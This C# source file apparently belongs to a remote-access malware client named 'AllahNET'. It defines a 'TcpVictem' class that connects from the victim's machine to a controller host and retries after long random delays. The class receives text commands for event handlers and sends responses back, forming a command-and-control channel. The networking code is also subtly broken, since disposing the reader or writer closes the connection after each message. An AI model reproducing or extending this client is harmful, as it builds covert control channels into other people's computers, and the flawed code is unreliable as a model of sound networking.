using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace AllahNET.Client
{
    public class TcpVictem
    {
        public TcpClient __cilent__ { get; set; }
        public object __tag__ { get; set; }
        public string __host__ { get; set; }
        public int __port__ { get; set; }

        #region الحمد لله رب العالمين

        private static TcpVictem INS;

        public TcpVictem(string host, int port)
        {
            _instance_ = this;
            __host__ = host;
            __port__ = port;
        }

        public static TcpVictem _instance_
        {
            get
            {
                return INS;
            }
            private set
            {
                INS = value;
            }
        }

        #endregion

        public virtual void DISP()
        {
            try
            {
                TcpVictemEvents._instance_.___discon___();
                __cilent__.Close();
                __cilent__ = null;
                __tag__ = null;
                __host__ = null;
            }
            catch { }
        }

        public virtual void Conect()
        {
            __cilent__ = new TcpClient();
            
            try
            {
                __cilent__.Connect(__host__, __port__);
            }
            catch
            {
                if (!__cilent__.Connected)
                {
                    Thread.Sleep(new Random().Next(1, 99999999));
                    __cilent__.Connect(__host__, __port__);
                }
            }

            if (__cilent__.Connected)
            {
                TcpVictemEvents._instance_.___con___();

                __cilent__.GetStream().BeginRead(new byte[0] { }, 0, 0, RDCB, null);
            }
        }

        public virtual void RDCB(IAsyncResult ar)
        {
            try
            {
                using (StreamReader _rdr_ = new StreamReader(__cilent__.GetStream()))
                {
                    string _;

                    if ((_ = _rdr_.ReadLine()) != null)
                    {
                        TcpVictemEvents._instance_.___recv___(_);
                    }
                }
            }
            catch { DISP(); }
            finally
            {
                __cilent__.GetStream().BeginRead(new byte[0] { }, 0, 0, RDCB, null);
            }
        }

        public virtual void SND(string ting)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(__cilent__.GetStream()))
                {
                    writer.WriteLine(ting);
                    writer.Flush();
                }
            }
            catch { DISP(); }
        }
    }
}
